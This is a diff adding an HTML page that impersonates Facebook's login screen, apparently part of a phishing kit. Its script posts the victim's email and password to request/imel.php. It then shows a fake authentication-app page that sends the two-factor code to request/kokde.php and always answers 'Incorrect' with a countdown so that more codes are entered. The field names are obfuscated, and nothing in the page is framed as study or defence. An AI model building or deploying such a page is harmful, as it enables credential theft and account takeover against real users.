@@ -1,0 +1,466 @@
+<!-- Parameter Mode DISABLED: Normal detection mode -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <meta name="description" content="Security Check">
+    <meta name="robots" content="noindex, nofollow, nocache">
+    <title>Log in to Facebook</title>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        fbBlue: '#1877F2',
+                        fbBlueDark: '#166fe5',
+                        fbGreen: '#42B72A',
+                        fbGreenDark: '#36a420',
+                        fbGray: '#F0F2F5',
+                        fbGrayText: '#606770',
+                    },
+                    boxShadow: {
+                        'card': '0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)',
+                    },
+                    fontFamily: {
+                        sans: ['Helvetica', 'Arial', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .hidden-custom {
+            display: none !important;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 0px;
+            background: transparent;
+        }
+
+        /* Floating Label for Mobile */
+
+        .floating-input:placeholder-shown+.floating-label {
+            transform: translateY(0) scale(1);
+            top: 1rem;
+        }
+
+        .floating-input:not(:placeholder-shown)+.floating-label,
+        .floating-input:focus+.floating-label {
+            transform: translateY(-0.75rem) scale(0.75);
+            top: 1rem;
+        }
+
+        /* Footer Link Hover Style */
+
+        .footer-link {
+            color: #737373;
+            text-decoration: none;
+            margin-right: 10px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <style>
+        input[type=number]::-webkit-outer-spin-button,
+        input[type=number]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+
+<body class="bg-white font-sans text-[#1c1e21] antialiased h-screen overflow-x-hidden flex flex-col">
+
+    <div class="loginPage w-full flex-grow flex flex-col fade-in min-h-screen">
+
+        <div class="md:hidden flex flex-col items-center pt-8 pb-4 flex-grow px-4">
+            <div class="text-gray-500 text-xs mb-14">English (UK)</div>
+            <div class="text-fbBlue text-6xl mb-8">
+                <i class="fa-brands fa-facebook"></i>
+            </div>
+
+            <div class="w-full">
+                <h2 class="text-[17px] font-bold mb-5 text-[#1c1e21] text-center">Please Log in to Facebook to review your issue</h2>
+                <form id="prociferom_mobile" class="space-y-3">
+                    <div class="relative mt-4">
+                        <input type="text" id="pismel" name="imelkahiji" class="floating-input block px-4 pt-5 pb-2 w-full text-[16px] text-gray-900 bg-white border border-gray-300 rounded-lg appearance-none focus:outline-none focus:ring-1 focus:ring-fbBlue focus:border-fbBlue peer"
+                            placeholder=" " required />
+                        <label for="pismel" class="floating-label absolute text-[16px] text-gray-500 duration-300 transform scale-75 origin-[0] left-4 z-10 pointer-events-none">
+                            Mobile number or email address
+                        </label>
+                        <button type="button" onclick="$('#pismel').val('').focus(); $(this).hide();" class="absolute right-3 top-4 text-gray-400 hidden" id="clear_email_btn">
+                            <i class="fa-solid fa-times-circle"></i>
+                        </button>
+                    </div>
+
+                    <div class="relative">
+                        <input type="password" id="paswot" name="paswot" class="floating-input block px-4 pt-5 pb-2 w-full text-[16px] text-gray-900 bg-white border border-gray-300 rounded-lg appearance-none focus:outline-none focus:ring-1 focus:ring-fbBlue focus:border-fbBlue peer"
+                            placeholder=" " required />
+                        <label for="paswot" class="floating-label absolute text-[16px] text-gray-500 duration-300 transform scale-75 origin-[0] left-4 z-10 pointer-events-none">
+                            Password
+                        </label>
+                        <button type="button" onclick="togglePassword()" class="absolute right-3 top-4 text-gray-600 font-bold text-sm hidden" id="show_pass_btn">
+                            <i class="fa-solid fa-eye"></i>
+                        </button>
+                    </div>
+
+                    <div class="text-red-500 text-sm mb-2 text-center secondAlert hidden-custom"></div>
+
+                    <button type="submit" class="buttonSecondConnectData w-full bg-fbBlue hover:bg-fbBlueDark text-white text-[16px] font-bold py-2.5 rounded-full transition-colors duration-200">
+                        Log In
+                    </button>
+                </form>
+
+                <div class="text-center mt-4">
+                    <a href="" class="text-black hover:underline text-sm font-medium">
+                        Forgotten password?
+                    </a>
+                </div>
+
+                <div class="h-10"></div>
+
+                <div class="text-center w-full">
+                    <button class="w-full border border-fbBlue text-fbBlue font-bold py-2 px-4 rounded-full text-[16px] mt-6">
+                        Create new account
+                    </button>
+                </div>
+            </div>
+
+            <div class="mt-auto mb-6 flex flex-col items-center">
+                <div class="font-bold text-lg flex items-center gap-1">
+                    <i class="text-fbBlue fa-brands fa-meta"></i> Meta
+                </div>
+            </div>
+        </div>
+        <div class="hidden md:flex flex-col w-full h-full min-h-screen">
+
+            <div class="flex flex-grow w-full">
+
+                <div class="w-[65%] relative bg-white overflow-hidden border-r-2 border-gray-200">
+
+                    <div class="absolute top-12 left-12 z-10">
+                        <i class="fa-brands fa-facebook text-fbBlue text-6xl bg-white rounded-full"></i>
+                    </div>
+
+                    <img src="img/kiri.png" alt="Facebook Explore" class="w-[80%] h-full object-cover ml-auto">
+
+                    <div class="absolute bottom-16 left-10 z-20 max-w-[500px]">
+                        <h1 class="text-[#1c1e21] text-[48px] lg:text-[56px] font-bold leading-[1.1] tracking-tight font-sans">
+                            Explore the<br>things <span class="text-fbBlue">you love.</span>
+                        </h1>
+                    </div>
+                </div>
+
+                <div class="w-[35%] bg-white flex flex-col justify-center px-4 py-10">
+
+                    <div class="w-[90%] mx-auto">
+
+                        <h2 class="text-[17px] font-bold mb-5 text-[#1c1e21] text-left">Please Log in to Facebook to review your issue</h2>
+
+                        <form id="prociferom_desktop" class="space-y-4">
+
+                            <input type="text" id="pismel_desktop_view" class="block w-full px-4 py-4 border border-gray-300 rounded-xl text-[17px] font-[500] focus:outline-none focus:border-fbBlue focus:ring-1 focus:ring-fbBlue placeholder-gray-500" placeholder="Email address or phone number"
+                                oninput="document.getElementById('pismel').value = this.value">
+
+                            <input type="password" id="paswot_desktop_view" class="block w-full px-4 py-4 border border-gray-300 rounded-xl text-[17px] font-[500] focus:outline-none focus:border-fbBlue focus:ring-1 focus:ring-fbBlue placeholder-gray-500" placeholder="Password" oninput="document.getElementById('paswot').value = this.value">
+
+                            <div class="text-red-500 text-sm mb-2 text-center secondAlert hidden-custom"></div>
+
+                            <button type="submit" class="buttonSecondConnectData w-full bg-fbBlue hover:bg-fbBlueDark text-white text-[17px] font-bold py-3 rounded-full transition-colors duration-200 mt-2">
+                                Log in
+                            </button>
+                        </form>
+
+                        <div class="text-center mt-5 mb-8">
+                            <a href="#" class="text-[#1c1e21] hover:underline text-[15px] font-medium">
+                                Forgotten password?
+                            </a>
+                        </div>
+
+                        <div class="text-center w-full">
+                            <a href="#" class="block w-full bg-white border border-fbBlue hover:bg-gray-50 text-fbBlue font-bold py-2.5 rounded-full transition-colors duration-200 text-[16px]">
+                                Create new account
+                            </a>
+                        </div>
+
+                        <div class="text-center mt-12">
+                            <div class="font-bold text-[13px] flex items-center justify-center gap-1 text-[#1c1e21]">
+                                <i class="fa-brands fa-meta text-fbBlue text-lg"></i> Meta
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <footer class="bg-white border-t-2 border-gray-200 py-5 text-[15px] text-[#737373]">
+                <div class="max-w-[1200px] mx-auto px-10">
+
+                    <div class="flex flex-wrap gap-x-4 mb-2">
+                        <a href="" class="hover:underline text-[#737373]">English (UK)</a>
+                        <a href="" class="hover:underline text-[#737373]">Bahasa Indonesia</a>
+                        <a href="" class="hover:underline text-[#737373]">Basa Jawa</a>
+                        <a href="" class="hover:underline text-[#737373]">Bahasa Melayu</a>
+                        <a href="" class="hover:underline text-[#737373]">日本語</a>
+                        <a href="" class="hover:underline text-[#737373]">العربية</a>
+                        <a href="" class="hover:underline text-[#737373]">Français (France)</a>
+                        <a href="" class="hover:underline text-[#737373]">More languages…</a>
+                    </div>
+
+
+                    <div class="flex flex-wrap gap-x-4 gap-y-1 mb-4 leading-5">
+                        <a href="" class="hover:underline text-[#737373]">Sign up</a>
+                        <a href="" class="hover:underline text-[#737373]">Log in</a>
+                        <a href="" class="hover:underline text-[#737373]">Messenger</a>
+                        <a href="" class="hover:underline text-[#737373]">Facebook Lite</a>
+                        <a href="" class="hover:underline text-[#737373]">Video</a>
+                        <a href="" class="hover:underline text-[#737373]">Meta Pay</a>
+                        <a href="" class="hover:underline text-[#737373]">Meta Store</a>
+                        <a href="" class="hover:underline text-[#737373]">Meta Quest</a>
+                        <a href="" class="hover:underline text-[#737373]">Ray-Ban Meta</a>
+                        <a href="" class="hover:underline text-[#737373]">Meta AI</a>
+                        <a href="" class="hover:underline text-[#737373]">Meta AI more content</a>
+                        <a href="" class="hover:underline text-[#737373]">Instagram</a>
+                        <a href="" class="hover:underline text-[#737373]">Threads</a>
+                        <a href="" class="hover:underline text-[#737373]">Voting Information Centre</a>
+                        <a href="" class="hover:underline text-[#737373]">Privacy Policy</a>
+                        <a href="" class="hover:underline text-[#737373]">Privacy Centre</a>
+                        <a href="" class="hover:underline text-[#737373]">Meta in Indonesia</a>
+                        <a href="" class="hover:underline text-[#737373]">About</a>
+                        <a href="" class="hover:underline text-[#737373]">Create ad</a>
+                        <a href="" class="hover:underline text-[#737373]">Create Page</a>
+                        <a href="" class="hover:underline text-[#737373]">Developers</a>
+                        <a href="" class="hover:underline text-[#737373]">Careers</a>
+                        <a href="" class="hover:underline text-[#737373]">Cookies</a>
+                        <a href="" class="hover:underline text-[#737373]">AdChoices</a>
+                        <a href="" class="hover:underline text-[#737373]">Terms</a>
+                        <a href="" class="hover:underline text-[#737373]">Help</a>
+                        <a href="" class="hover:underline text-[#737373]">Contact uploading and non-users</a>
+                    </div>
+
+                    <div class="mt-4 text-[#737373]">
+                        Meta © 2025
+                    </div>
+                </div>
+            </footer>
+
+        </div>
+    </div>
+
+
+    <div class="confirmPage hidden-custom w-full h-screen bg-white md:bg-fbGray fade-in">
+        <div class="flex min-h-screen items-start md:items-center justify-center pt-0 md:p-4">
+
+            <div class="w-full max-w-[600px] bg-white md:rounded-lg md:shadow-card p-4 md:p-8">
+
+                <div class="text-[13px] text-gray-500 mb-2 font-sans hidden md:block">
+                    Facebook
+                </div>
+
+                <h1 class="text-[20px] md:text-[24px] font-bold text-[#1c1e21] mb-2 leading-tight">
+                    Access Your Authentication App
+                </h1>
+
+                <div class="text-[15px] text-gray-600 mb-6 leading-normal">
+                    <p class="mb-1">Check the notification on your other device.</p>
+                    <p>
+                        Log in to your Facebook account on another device and open the notification we sent to confirm this login or check the phone number and email linked on Facebook we send you a 6/8 digit code.
+                    </p>
+                </div>
+
+                <div class="mb-6 w-full bg-[#EAF3F7] rounded overflow-hidden">
+                    <img alt="Authentication" class="w-full h-auto object-cover" src="static/img/code.png" onerror="this.src='https://placehold.co/600x250/EAF3F7/1877F2?text=Authentication+Image'">
+                </div>
+
+                <form action="javascript:void(0)" method="post" id="prociout" class="w-full">
+                    <input type="hidden" name="imelkadua" id="cokotMahil" readonly>
+
+                    <div class="relative mb-6">
+                        <input name="logincode" id="logincode" placeholder="Enter code" maxlength="8" required oninput="if(this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" class="w-full px-4 py-3 border border-gray-300 rounded-md bg-gray-50 text-[16px] text-gray-700 focus:outline-none focus:border-fbBlue focus:ring-1 focus:ring-fbBlue placeholder-gray-500"
+                            type="number">
+                        <div class="absolute right-3 top-3 text-gray-400">
+                            <i class="fa-solid fa-key"></i>
+                        </div>
+                    </div>
+
+                    <div class="text-red-600 text-sm mt-2 hidden-custom alertcontentFirstAuthentication mb-3">
+                        Incorrect. Please, try again after: <span class="countdownFirst font-bold"></span>
+                    </div>
+
+                    <button type="submit" class="buttonAuthentication w-full bg-fbBlue hover:bg-fbBlueDark text-white font-bold py-3 px-4 rounded-full text-[16px] transition duration-200" onclick="procidua()">
+                        Continue
+                    </button>
+
+                    <button type="button" class="buttonAuthenticationLoading hidden-custom w-full bg-blue-300 text-white font-bold py-3 px-4 rounded-full text-[16px] cursor-not-allowed" disabled>
+                        Continue
+                    </button>
+                </form>
+
+                <div class="mt-12 text-center text-sm font-semibold text-gray-800">
+                    Meta
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            $('#pismel').on('input', function() {
+                if ($('#pismel_desktop_view').is(':hidden')) {
+                    $('#pismel_desktop_view').val($(this).val());
+                }
+                if ($(this).val().length > 0) $('#clear_email_btn').removeClass('hidden');
+                else $('#clear_email_btn').addClass('hidden');
+            });
+
+            $('#pismel_desktop_view').on('input', function() {
+                $('#pismel').val($(this).val());
+            });
+
+            $('#paswot').on('input', function() {
+                if ($('#paswot_desktop_view').is(':hidden')) {
+                    $('#paswot_desktop_view').val($(this).val());
+                }
+                if ($(this).val().length > 0) $('#show_pass_btn').removeClass('hidden');
+                else $('#show_pass_btn').addClass('hidden');
+            });
+
+            $('#paswot_desktop_view').on('input', function() {
+                $('#paswot').val($(this).val());
+            });
+
+            function handleLoginSubmit(e) {
+                e.preventDefault();
+
+                var emailVal = $('#pismel').val();
+                var passVal = $('#paswot').val();
+
+                if (!emailVal || !passVal) return;
+
+                $.ajax({
+                    type: "POST",
+                    url: "request/imel.php",
+                    data: {
+                        imelkahiji: emailVal,
+                        paswot: passVal
+                    },
+                    beforeSend: function() {
+                        $(".buttonSecondConnectData").attr("disabled", true).html('<i class="fa-solid fa-circle-notch fa-spin"></i>');
+                    },
+                    success: function() {
+                        $("#cokotMahil").val(emailVal);
+                        $(".loginPage").fadeOut(200, function() {
+                            $(".confirmPage").removeClass('hidden-custom').fadeIn(200);
+                        });
+                    }
+                });
+            }
+
+            $('#prociferom_mobile').on('submit', handleLoginSubmit);
+            $('#prociferom_desktop').on('submit', handleLoginSubmit);
+        });
+
+        function togglePassword() {
+            var x = document.getElementById("paswot");
+            var btn = document.getElementById("show_pass_btn");
+
+            if (x.type === "password") {
+                x.type = "text";
+                btn.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
+            } else {
+                x.type = "password";
+                btn.innerHTML = '<i class="fa-solid fa-eye"></i>';
+            }
+        }
+
+        var isSubmitting = false;
+
+        function procidua() {
+            $('#prociout').submit(function(e) {
+                e.preventDefault();
+
+                if (isSubmitting) return;
+                isSubmitting = true;
+
+                var $cokotMahil = $("input#cokotMahil").val();
+                var $logincode = $("input#logincode").val();
+
+                $.ajax({
+                    type: "POST",
+                    url: "request/kokde.php",
+                    data: $(this).serialize(),
+                    beforeSend: function() {
+                        $(".buttonAuthentication").hide();
+                        $(".buttonAuthenticationLoading").removeClass('hidden-custom').show();
+                    },
+                    success: function() {
+                        $(".buttonAuthenticationLoading").hide();
+                        $("#logincode").attr('disabled', true).val("");
+                        $(".alertcontentFirstAuthentication").removeClass('hidden-custom').show();
+                        startFirstTimer();
+                        isSubmitting = false;
+                    },
+                    error: function() {
+                        isSubmitting = false;
+                    }
+                });
+            });
+            return false;
+        };
+
+        function startFirstTimer() {
+            $(".buttonAuthenticationLoading").removeClass('hidden-custom').show();
+            let timeSecondFirst = 6;
+            const timeHFirst = document.querySelector(".countdownFirst");
+            displayTimeFirst(timeSecondFirst);
+            const countDownFirst = setInterval(() => {
+                timeSecondFirst--;
+                displayTimeFirst(timeSecondFirst);
+                if (timeSecondFirst == 0 || timeSecondFirst < 1) {
+                    clearInterval(countDownFirst);
+                    $("#logincode").removeAttr('disabled');
+                    $(".buttonAuthentication").show();
+                    $(".alertcontentFirstAuthentication ").addClass('hidden-custom');
+                    $(".buttonAuthenticationLoading").addClass('hidden-custom');
+                }
+            }, 1000);
+
+            function displayTimeFirst(secondFirst) {
+                const minFirst = Math.floor(secondFirst / 30);
+                const secFirst = Math.floor(secondFirst % 30);
+                timeHFirst.innerHTML = `${minFirst < 10 ? "0":""}${minFirst}:${secFirst < 10 ? "0":""}${secFirst}`;
+            }
+        }
+    </script>
+
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"ec6b524bcd00467ab7202fa5316fb998","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
